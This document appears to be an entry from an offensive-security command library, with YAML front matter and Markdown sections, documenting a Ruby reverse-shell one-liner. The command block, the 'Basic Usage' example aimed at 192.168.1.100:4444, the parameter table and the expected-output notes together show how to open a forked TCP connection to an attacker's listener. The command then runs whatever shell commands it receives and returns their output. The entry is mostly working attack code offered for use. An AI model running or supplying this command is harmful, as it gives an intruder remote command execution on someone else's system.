---
type: command
executor: bash
data: >-
  ruby -rsocket -e'exit if
  fork;c=TCPSocket.new("$_ATTACKER_IP","$_PORT");loop{c.gets.chomp!;(exit! if
  $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print
  io.read}))rescue c.puts "failed: #{$_}"}'
output: null
created_at: '2024-01-01T00:00:00Z'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - Linux
tags:
  - reverse-shell
  - ruby
verified: true
validated: true
---

# ruby-remote-command-execution-unix

## Command

```bash
ruby -rsocket -e'exit if fork;c=TCPSocket.new("$_ATTACKER_IP","$_PORT");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
```

## Description

This command sets up a reverse connection for remote command execution on Unix-like systems, with support for directory changes and an exit command. It forks to avoid blocking and loops to handle multiple commands.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ATTACKER_IP | IP address of the attacker's listener | Yes |
| $_PORT | Port on which the attacker is listening | Yes |
| -rsocket | Loads Ruby's socket library | Built-in |
| -e | Executes the following Ruby expression | Built-in |

## Examples

### Basic Usage

```bash
ruby -rsocket -e'exit if fork;c=TCPSocket.new("192.168.1.100","4444");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
```

### Advanced Usage

Send commands like `ls`, `cd /tmp`, or `exit` via the listener.

## Expected Output

The listener receives command outputs, e.g., for `ls`: file listings. Errors show "failed: command". Successful exit closes the connection cleanly.

## Related

- [[procedures/Establish-Ruby-Reverse-Shell]]
- [[commands/ruby-interactive-reverse-shell]]
